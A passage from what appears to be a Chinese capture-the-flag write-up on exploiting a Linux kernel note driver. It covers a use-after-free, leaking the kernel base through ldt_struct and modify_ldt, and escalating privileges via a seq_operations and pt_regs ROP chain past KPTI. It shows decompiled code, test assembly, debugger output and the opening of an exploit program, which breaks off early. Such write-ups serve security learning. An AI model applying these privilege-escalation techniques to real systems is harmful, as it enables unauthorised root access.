<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)cmd == <span class="number">0x6668</span> )                  <span class="comment">// FREE_NOTE</span></span><br><span class="line">&#123;</span><br><span class="line">  key = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( index &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    note_tmp = buf[index];</span><br><span class="line">    <span class="keyword">if</span> ( note_tmp )</span><br><span class="line">    &#123;</span><br><span class="line">      kfree(note_tmp);</span><br><span class="line">      key = <span class="number">0LL</span>;</span><br><span class="line">      buf[index] = <span class="number">0LL</span>;                       <span class="comment">// UAF</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在内核内存释放时，只置空了全局变量 buf，而没有置空 note</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)cmd == <span class="number">0x6669</span> )                  <span class="comment">// EDIT_NOTE</span></span><br><span class="line">&#123;</span><br><span class="line">  key = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( note )</span><br><span class="line">  &#123;</span><br><span class="line">    *note = index;</span><br><span class="line">    key = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>允许向全局变量 note 中写入数据</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>有 UAF，申请的大小为 0x8 字节，在 Slub 中是 kmalloc-8</p>
<p>但本题目没有使用常规的 Slub，而是 Slab：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_SLAB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>Random Freelist：slab 的 freelist 会进行一定的随机化</li>
<li>Hardened Freelist：slab 的 freelist 中的 object 的 next 指针会与一个 cookie 进行异或</li>
<li>Hardened Usercopy：在向内核拷贝数据时会进行检查：<ul>
<li>地址是否存在</li>
<li>是否在堆栈中</li>
<li>是否为 slab 中 object</li>
<li>是否非内核 <code>.text</code> 段内地址</li>
</ul>
</li>
<li>Static Usermodehelper Path：<code>modprobe_path</code> 为只读，不可修改</li>
</ul>
<p>在 Slab 中的最小 object 为32字节，因此本程序会申请 kmalloc-32，于是选择使用 <code>ldt_struct + modify_ldt</code> 来泄露内核基地址（在之前的博客中提到过）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="keyword">int</span> , func , <span class="keyword">void</span> __user * , ptr ,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (func) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        ret = read_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里需要注意 <code>read_ldt</code> 和 <code>write_ldt</code> 函数：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">write_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount, <span class="keyword">int</span> oldmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct ldt_struct *<span class="title">alloc_ldt_struct</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_entries)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (num_entries &gt; LDT_ENTRIES)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new_ldt = kmalloc(<span class="keyword">sizeof</span>(struct ldt_struct), GFP_KERNEL);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>write_ldt</code> 中会调用 <code>alloc_ldt_struct</code>，然后根据用户输入的大小来重新分配 <code>ldt_struct</code> 结构体</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">read_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">        retval = -EFAULT;</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>read_ldt</code> 会调用 <code>copy_to_user</code> 将 <code>ldt_struct-&gt;entries</code> 中的数据返回给用户态</li>
</ul>
<p>泄露的思路如下：</p>
<ul>
<li>申请并释放一个 <code>object</code></li>
<li>使用 <code>write_ldt</code> 中的 <code>alloc_ldt_struct</code> 函数复用这个 <code>object</code></li>
<li>使用 UAF 修改 <code>object-&gt;entries</code></li>
<li>使用 <code>read_ldt</code> 将 <code>object-&gt;entries</code> 输送给用户态</li>
</ul>
<p>由于在通常情况下内核会开启 <code>hardened usercopy</code> 保护，当 <code>copy_to_user</code> 的源地址为内核 <code>.text</code> 段（包括 <code>_stext</code> 和 <code>_etext</code>）时会引起 <code>kernel panic</code></p>
<p>我们只能先爆破线性映射区 <code>direct mapping area</code>（kmalloc 使用的空间），然后通过 <code>read_ldt</code> 在堆上读取一些可利用的内核指针并泄露内核基地址</p>
<p>大致模板如下：</p>
<p>如果直接搜索整个线性映射区域，很有可能触发 hardened usercopy 的检查（目前不知道原因）</p>
<p>可以通过 <code>fork</code> 函数来绕过该检查，原理如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys_fork()</span><br><span class="line">    kernel_clone()</span><br><span class="line">        copy_process()</span><br><span class="line">            copy_mm()</span><br><span class="line">                dup_mm()</span><br><span class="line">                    dup_mmap()</span><br><span class="line">                        arch_dup_mmap()</span><br><span class="line">                            ldt_dup_context()</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ldt_dup_context</span><span class="params">(struct mm_struct *old_mm, struct mm_struct *mm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在这里会通过 <code>memcpy</code> 将父进程的 <code>ldt-&gt;entries</code> 拷贝给子进程，是完全处在内核中的操作，因此不会触发 hardened usercopy 的检查</li>
<li>只需要在父进程中设定好搜索的地址之后再开子进程来用 <code>read_ldt</code> 读取数据即可</li>
</ul>
<p>接下来有两种提权思路：</p>
<ul>
<li>使用 <code>seq_operations + pt_regs</code> 绕过 KPTI</li>
<li>在 <code>write_ldt</code> 中进行条件竞争，使用 Double fetch 修改进程 uid 完成提权</li>
</ul>
<p><strong>seq_operations + pt_regs</strong></p>
<p>结构体 <code>seq_operations</code> 的条目如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>打开 <code>/proc/self/stat</code> 文件就可以分配一个 <code>seq_operations</code></li>
<li>对其进行 Read 即可触发 <code>seq_operations-&gt;start</code></li>
</ul>
<p>结构体 <code>pt_regs</code> 的条目如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>当执行 <code>entry_SYSCALL_64</code> 时会将所有的寄存器压入内核栈上，形成一个 <code>pt_regs</code> 结构体</li>
<li>在系统调用的过程 <code>r8 ~ r15</code> 其实是用不上的，可以在这里放置 ROP 链</li>
<li>由于开了 KPTI，则需要在 ROP 末尾放上 <code>swapgs_restore_regs_and_return_to_usermode + offset</code> 用于在回到用户态前修改 CR4 寄存器</li>
<li>PS：这个 <code>offset</code> 在不同的内核版本中有所不同，可以通过调试来确定其值</li>
</ul>
<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15,   0x55555555;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14,   0x44444444;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13,   0x33333333;&quot;</span> <span class="comment">// start</span></span><br><span class="line">    <span class="string">&quot;mov r12,   0x22222222;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp,   0x11111111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx,   0xbbbbbbbb;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11,   0x11111111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10,   0x00000000;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9,    0x88888888;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi,   seq_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>GDB 打印内存如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffffa950001b3f68</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0xffffa950001b3f68</span> ◂— <span class="keyword">xor</span>    esi, dword ptr [rbx] <span class="comment">/* 0x33333333; &#x27;3333&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0xffffa950001b3f70</span> ◂— <span class="keyword">and</span>    ah, byte ptr [rdx] <span class="comment">/* 0x22222222; &#x27;&quot;&quot;&quot;&quot;&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0xffffa950001b3f78</span> ◂— stosb  byte ptr [rdi], al <span class="comment">/* 0xaaaaaaaa */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0xffffa950001b3f80</span> ◂— mov    ebx, <span class="number">0xbbbbbb</span> <span class="comment">/* 0xbbbbbbbb */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0xffffa950001b3f88</span> ◂— <span class="number">0x246</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0xffffa950001b3f90</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0xffffa950001b3f98</span> ◂— mov    byte ptr [rax + <span class="number">0x8888</span>], cl <span class="comment">/* 0x88888888 */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0xffffa950001b3fa0</span> ◂— cdq     <span class="comment">/* 0x99999999 */</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0xffffa950001b3fa8</span> ◂— <span class="number">0xffffffffffffffda</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0xffffa950001b3fb0</span> —▸ <span class="number">0x40217a</span> ◂— call   <span class="number">0x401c61</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0xffffa950001b3fb8</span> ◂— <span class="number">8</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0xffffa950001b3fc0</span> —▸ <span class="number">0x7ffe497db4c0</span> ◂— pop    rax <span class="comment">/* 0xa4497db658 */</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0xffffa950001b3fc8</span> ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0xffffa950001b3fd0</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0xffffa950001b3fd8</span> —▸ <span class="number">0x40217a</span> ◂— call   <span class="number">0x401c61</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0xffffa950001b3fe0</span> ◂— <span class="number">0x33</span> <span class="comment">/* &#x27;3&#x27; */</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0xffffa950001b3fe8</span> ◂— <span class="number">0x246</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0xffffa950001b3ff0</span> —▸ <span class="number">0x7ffe497db4c0</span> ◂— pop    rax <span class="comment">/* 0xa4497db658 */</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0xffffa950001b3ff8</span> ◂— <span class="number">0x2b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在合适和位置放置合适的 gadget 就好了</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FREE_NOTE 0x6668</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT_NOTE 0x6666</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CREATE_NOTE 0x6667</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EDIT_NOTE 0x6669</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="keyword">int</span> 